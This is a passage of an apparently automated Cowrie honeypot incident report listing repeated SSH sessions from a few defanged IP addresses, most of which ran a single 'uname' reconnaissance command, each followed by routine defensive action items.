| `2026-06-25 07:47:48` | `cowrie.client.kex` |
| `2026-06-25 07:47:48` | `cowrie.login.success` |
| `2026-06-25 07:47:49` | `cowrie.session.params` |
| `2026-06-25 07:47:49` | `cowrie.command.input` |
| `2026-06-25 07:47:50` | `cowrie.log.closed` |
| `2026-06-25 07:47:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7c7aa5126e61

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:47 |
| **Last Seen** | 2026-06-25 07:48 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:47:58` | `cowrie.session.connect` |
| `2026-06-25 07:47:58` | `cowrie.client.version` |
| `2026-06-25 07:47:58` | `cowrie.client.kex` |
| `2026-06-25 07:47:59` | `cowrie.login.success` |
| `2026-06-25 07:47:59` | `cowrie.session.params` |
| `2026-06-25 07:47:59` | `cowrie.command.input` |
| `2026-06-25 07:48:00` | `cowrie.log.closed` |
| `2026-06-25 07:48:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-168f428d33ee

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:49 |
| **Last Seen** | 2026-06-25 07:49 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:49:01` | `cowrie.session.connect` |
| `2026-06-25 07:49:01` | `cowrie.client.version` |
| `2026-06-25 07:49:01` | `cowrie.client.kex` |
| `2026-06-25 07:49:01` | `cowrie.login.success` |
| `2026-06-25 07:49:02` | `cowrie.session.params` |
| `2026-06-25 07:49:02` | `cowrie.command.input` |
| `2026-06-25 07:49:02` | `cowrie.log.closed` |
| `2026-06-25 07:49:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb8f27ada8b1

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:49 |
| **Last Seen** | 2026-06-25 07:49 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:49:43` | `cowrie.session.connect` |
| `2026-06-25 07:49:43` | `cowrie.client.version` |
| `2026-06-25 07:49:43` | `cowrie.client.kex` |
| `2026-06-25 07:49:44` | `cowrie.login.success` |
| `2026-06-25 07:49:45` | `cowrie.session.params` |
| `2026-06-25 07:49:45` | `cowrie.command.input` |
| `2026-06-25 07:49:45` | `cowrie.log.closed` |
| `2026-06-25 07:49:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ef6d59781690

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:50 |
| **Last Seen** | 2026-06-25 07:50 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:50:05` | `cowrie.session.connect` |
| `2026-06-25 07:50:05` | `cowrie.client.version` |
| `2026-06-25 07:50:06` | `cowrie.client.kex` |
| `2026-06-25 07:50:06` | `cowrie.login.success` |
| `2026-06-25 07:50:07` | `cowrie.session.params` |
| `2026-06-25 07:50:07` | `cowrie.command.input` |
| `2026-06-25 07:50:07` | `cowrie.log.closed` |
| `2026-06-25 07:50:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e18a6e74ea7d

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:50 |
| **Last Seen** | 2026-06-25 07:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:50:43` | `cowrie.session.connect` |
| `2026-06-25 07:50:43` | `cowrie.client.version` |
| `2026-06-25 07:50:44` | `cowrie.client.kex` |
| `2026-06-25 07:50:44` | `cowrie.login.success` |
| `2026-06-25 07:50:45` | `cowrie.session.params` |
| `2026-06-25 07:50:45` | `cowrie.command.input` |
| `2026-06-25 07:50:46` | `cowrie.log.closed` |
| `2026-06-25 07:50:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-25773c659b42

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:50 |
| **Last Seen** | 2026-06-25 07:50 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:50:50` | `cowrie.session.connect` |
| `2026-06-25 07:50:50` | `cowrie.client.version` |
| `2026-06-25 07:50:51` | `cowrie.client.kex` |
| `2026-06-25 07:50:51` | `cowrie.login.success` |
| `2026-06-25 07:50:52` | `cowrie.session.params` |
| `2026-06-25 07:50:52` | `cowrie.command.input` |
| `2026-06-25 07:50:53` | `cowrie.log.closed` |
| `2026-06-25 07:50:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d84527c5063d

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:51 |
| **Last Seen** | 2026-06-25 07:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:51:11` | `cowrie.session.connect` |
| `2026-06-25 07:51:11` | `cowrie.client.version` |
| `2026-06-25 07:51:11` | `cowrie.client.kex` |
| `2026-06-25 07:51:11` | `cowrie.login.success` |
| `2026-06-25 07:51:12` | `cowrie.session.params` |
| `2026-06-25 07:51:12` | `cowrie.command.input` |
| `2026-06-25 07:51:12` | `cowrie.log.closed` |
| `2026-06-25 07:51:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-05bcd6336627

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:51 |
| **Last Seen** | 2026-06-25 07:51 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:51:12` | `cowrie.session.connect` |
| `2026-06-25 07:51:12` | `cowrie.client.version` |
| `2026-06-25 07:51:12` | `cowrie.client.kex` |
| `2026-06-25 07:51:13` | `cowrie.login.success` |
| `2026-06-25 07:51:14` | `cowrie.session.params` |
| `2026-06-25 07:51:14` | `cowrie.command.input` |
| `2026-06-25 07:51:14` | `cowrie.log.closed` |
| `2026-06-25 07:51:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-156e51b5b1d4

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-25 07:51 |
| **Last Seen** | 2026-06-25 07:51 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:51:30` | `cowrie.session.connect` |
| `2026-06-25 07:51:32` | `cowrie.client.version` |
| `2026-06-25 07:51:32` | `cowrie.client.kex` |
| `2026-06-25 07:51:38` | `cowrie.login.success` |
| `2026-06-25 07:51:42` | `cowrie.session.params` |
| `2026-06-25 07:51:42` | `cowrie.command.input` |
| `2026-06-25 07:51:44` | `cowrie.log.closed` |
| `2026-06-25 07:51:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-52f73b264f8b

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:51 |
| **Last Seen** | 2026-06-25 07:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:51:50` | `cowrie.session.connect` |
| `2026-06-25 07:51:50` | `cowrie.client.version` |
| `2026-06-25 07:51:50` | `cowrie.client.kex` |
| `2026-06-25 07:51:51` | `cowrie.login.success` |
| `2026-06-25 07:51:52` | `cowrie.session.params` |
| `2026-06-25 07:51:52` | `cowrie.command.input` |
| `2026-06-25 07:51:52` | `cowrie.log.closed` |
| `2026-06-25 07:51:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ede8bb7b8aee

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:52 |
| **Last Seen** | 2026-06-25 07:52 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:52:02` | `cowrie.session.connect` |
| `2026-06-25 07:52:02` | `cowrie.client.version` |
| `2026-06-25 07:52:02` | `cowrie.client.kex` |
| `2026-06-25 07:52:02` | `cowrie.login.success` |
| `2026-06-25 07:52:04` | `cowrie.session.params` |
| `2026-06-25 07:52:04` | `cowrie.command.input` |
| `2026-06-25 07:52:04` | `cowrie.log.closed` |
| `2026-06-25 07:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b79a25813e74

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:52 |
| **Last Seen** | 2026-06-25 07:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:52:18` | `cowrie.session.connect` |
| `2026-06-25 07:52:18` | `cowrie.client.version` |
| `2026-06-25 07:52:18` | `cowrie.client.kex` |
| `2026-06-25 07:52:19` | `cowrie.login.success` |
| `2026-06-25 07:52:20` | `cowrie.session.params` |
| `2026-06-25 07:52:20` | `cowrie.command.input` |
| `2026-06-25 07:52:20` | `cowrie.log.closed` |
| `2026-06-25 07:52:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-826579210388

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:53 |
| **Last Seen** | 2026-06-25 07:53 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:53:21` | `cowrie.session.connect` |
| `2026-06-25 07:53:21` | `cowrie.client.version` |
| `2026-06-25 07:53:21` | `cowrie.client.kex` |
| `2026-06-25 07:53:21` | `cowrie.login.success` |
| `2026-06-25 07:53:22` | `cowrie.session.params` |
| `2026-06-25 07:53:22` | `cowrie.command.input` |
| `2026-06-25 07:53:22` | `cowrie.log.closed` |
| `2026-06-25 07:53:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7503b6686c60

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:54 |
| **Last Seen** | 2026-06-25 07:54 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:54:25` | `cowrie.session.connect` |
| `2026-06-25 07:54:25` | `cowrie.client.version` |
| `2026-06-25 07:54:25` | `cowrie.client.kex` |
| `2026-06-25 07:54:25` | `cowrie.login.success` |
| `2026-06-25 07:54:26` | `cowrie.session.params` |
| `2026-06-25 07:54:26` | `cowrie.command.input` |
| `2026-06-25 07:54:26` | `cowrie.log.closed` |
| `2026-06-25 07:54:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5df900ff0913

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:55 |
| **Last Seen** | 2026-06-25 07:55 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:55:04` | `cowrie.session.connect` |
| `2026-06-25 07:55:04` | `cowrie.client.version` |
| `2026-06-25 07:55:05` | `cowrie.client.kex` |
| `2026-06-25 07:55:05` | `cowrie.login.success` |
| `2026-06-25 07:55:06` | `cowrie.session.params` |
| `2026-06-25 07:55:06` | `cowrie.command.input` |
| `2026-06-25 07:55:06` | `cowrie.log.closed` |
| `2026-06-25 07:55:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d6e13579be9f

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:55 |
| **Last Seen** | 2026-06-25 07:55 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:55:27` | `cowrie.session.connect` |
| `2026-06-25 07:55:27` | `cowrie.client.version` |
| `2026-06-25 07:55:27` | `cowrie.client.kex` |
| `2026-06-25 07:55:27` | `cowrie.login.success` |
| `2026-06-25 07:55:28` | `cowrie.session.params` |
| `2026-06-25 07:55:28` | `cowrie.command.input` |
| `2026-06-25 07:55:28` | `cowrie.log.closed` |
| `2026-06-25 07:55:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-26f8b7de5806

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:56 |
| **Last Seen** | 2026-06-25 07:56 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:56:30` | `cowrie.session.connect` |
| `2026-06-25 07:56:30` | `cowrie.client.version` |
| `2026-06-25 07:56:30` | `cowrie.client.kex` |
| `2026-06-25 07:56:30` | `cowrie.login.success` |
| `2026-06-25 07:56:31` | `cowrie.session.params` |
| `2026-06-25 07:56:31` | `cowrie.command.input` |
| `2026-06-25 07:56:31` | `cowrie.log.closed` |
| `2026-06-25 07:56:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9fd972b80d1c

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:56 |
| **Last Seen** | 2026-06-25 07:56 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:56:44` | `cowrie.session.connect` |
| `2026-06-25 07:56:44` | `cowrie.client.version` |
| `2026-06-25 07:56:44` | `cowrie.client.kex` |
| `2026-06-25 07:56:45` | `cowrie.login.success` |
| `2026-06-25 07:56:45` | `cowrie.session.params` |
| `2026-06-25 07:56:45` | `cowrie.command.input` |
| `2026-06-25 07:56:46` | `cowrie.log.closed` |
| `2026-06-25 07:56:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9883088ef081

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:56 |
| **Last Seen** | 2026-06-25 07:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:56:58` | `cowrie.session.connect` |
| `2026-06-25 07:56:58` | `cowrie.client.version` |
| `2026-06-25 07:56:58` | `cowrie.client.kex` |
| `2026-06-25 07:56:59` | `cowrie.login.success` |
| `2026-06-25 07:57:00` | `cowrie.session.params` |
| `2026-06-25 07:57:00` | `cowrie.command.input` |
| `2026-06-25 07:57:00` | `cowrie.log.closed` |
| `2026-06-25 07:57:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd8359986e76

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:57 |
| **Last Seen** | 2026-06-25 07:57 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:57:35` | `cowrie.session.connect` |
| `2026-06-25 07:57:35` | `cowrie.client.version` |
| `2026-06-25 07:57:36` | `cowrie.client.kex` |
| `2026-06-25 07:57:36` | `cowrie.login.success` |
| `2026-06-25 07:57:37` | `cowrie.session.params` |
| `2026-06-25 07:57:37` | `cowrie.command.input` |
| `2026-06-25 07:57:37` | `cowrie.log.closed` |
| `2026-06-25 07:57:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b5f7ac3e79fb

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:57 |
| **Last Seen** | 2026-06-25 07:57 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:57:57` | `cowrie.session.connect` |
| `2026-06-25 07:57:57` | `cowrie.client.version` |
| `2026-06-25 07:57:57` | `cowrie.client.kex` |
| `2026-06-25 07:57:57` | `cowrie.login.success` |
| `2026-06-25 07:57:58` | `cowrie.session.params` |
| `2026-06-25 07:57:58` | `cowrie.command.input` |
| `2026-06-25 07:57:59` | `cowrie.log.closed` |
| `2026-06-25 07:57:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd2bc4e53764

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:58 |
| **Last Seen** | 2026-06-25 07:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:58:43` | `cowrie.session.connect` |
| `2026-06-25 07:58:43` | `cowrie.client.version` |
| `2026-06-25 07:58:43` | `cowrie.client.kex` |
| `2026-06-25 07:58:43` | `cowrie.login.success` |
| `2026-06-25 07:58:44` | `cowrie.session.params` |
| `2026-06-25 07:58:44` | `cowrie.command.input` |
| `2026-06-25 07:58:44` | `cowrie.log.closed` |
| `2026-06-25 07:58:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-89fb9fed8110

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:58 |
| **Last Seen** | 2026-06-25 07:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:58:53` | `cowrie.session.connect` |
| `2026-06-25 07:58:53` | `cowrie.client.version` |
| `2026-06-25 07:58:53` | `cowrie.client.kex` |
| `2026-06-25 07:58:54` | `cowrie.login.success` |
| `2026-06-25 07:58:55` | `cowrie.session.params` |
| `2026-06-25 07:58:55` | `cowrie.command.input` |
| `2026-06-25 07:58:55` | `cowrie.log.closed` |
| `2026-06-25 07:58:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-18ddc7dd74fb

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 07:58 |
| **Last Seen** | 2026-06-25 07:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:58:56` | `cowrie.session.connect` |
| `2026-06-25 07:58:56` | `cowrie.client.version` |
| `2026-06-25 07:58:56` | `cowrie.client.kex` |
| `2026-06-25 07:58:57` | `cowrie.login.success` |
| `2026-06-25 07:58:58` | `cowrie.session.params` |
| `2026-06-25 07:58:58` | `cowrie.command.input` |
| `2026-06-25 07:58:58` | `cowrie.log.closed` |
| `2026-06-25 07:58:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `139.59.86[.]13` to AbuseIPDB if not already reported
- [ ] Block `139.59.86[.]13` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1818e50f525c

| Field | Detail |
|---|---|
| **Source IP** | `209.99.185[.]59` |
| **First Seen** | 2026-06-25 07:59 |
| **Last Seen** | 2026-06-25 07:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-25 07:59:48` | `cowrie.session.connect` |
| `2026-06-25 07:59:48` | `cowrie.client.version` |
| `2026-06-25 07:59:48` | `cowrie.client.kex` |
| `2026-06-25 07:59:49` | `cowrie.login.success` |
| `2026-06-25 07:59:50` | `cowrie.session.params` |
| `2026-06-25 07:59:50` | `cowrie.command.input` |
| `2026-06-25 07:59:50` | `cowrie.log.closed` |
| `2026-06-25 07:59:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `209.99.185[.]59` to AbuseIPDB if not already reported
- [ ] Block `209.99.185[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3d9b83d7c58

| Field | Detail |
|---|---|
| **Source IP** | `139.59.86[.]13` |
| **First Seen** | 2026-06-25 08:00 |
| **Last Seen** | 2026-06-25 08:00 |
